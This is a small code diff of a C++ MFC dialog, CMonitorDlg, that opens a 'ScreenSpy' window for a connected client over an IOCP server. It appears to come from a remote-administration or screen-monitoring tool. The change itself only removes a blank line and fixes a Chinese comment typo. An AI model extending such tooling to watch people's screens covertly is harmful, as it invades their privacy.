@@ -14,7 +14,6 @@
 
 CIOCPServer *m_iocpServer = NULL;
 
-
 // CMonitorDlg dialog
 CMonitorDlg::CMonitorDlg(CWnd* pParent /*=NULL*/)
 	: CDialog(CMonitorDlg::IDD, pParent)
@@ -96,7 +95,7 @@ LRESULT CMonitorDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 //	g_pContext = pContext;
 
 	CScreenSpyDlg *dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
-	// 设置父窗口为卓面
+	// 设置父窗口为桌面
 	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
